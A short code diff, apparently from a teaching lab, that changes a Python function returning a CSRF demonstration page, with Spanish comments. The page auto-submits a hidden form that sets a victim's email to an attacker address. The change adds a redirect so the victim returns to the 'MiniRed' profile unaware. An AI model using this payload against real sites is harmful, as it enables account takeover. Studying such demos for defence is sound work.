@@ -53,7 +53,11 @@ def premio():
     <input type="hidden" name="email" value="atacante@evil.example">
     <input type="hidden" name="bio" value="Este perfil fue modificado por un ataque CSRF de demostracion.">
   </form>
-  <script>document.getElementById('f').submit();</script>
+  <script>
+    document.getElementById('f').submit();
+    // Despues del envio oculto, devolver a la victima a MiniRed como si nada hubiera pasado
+    setTimeout(function () {{ location.href = "{VICTIMA}/perfil"; }}, 2500);
+  </script>
 </body>"""
 
 
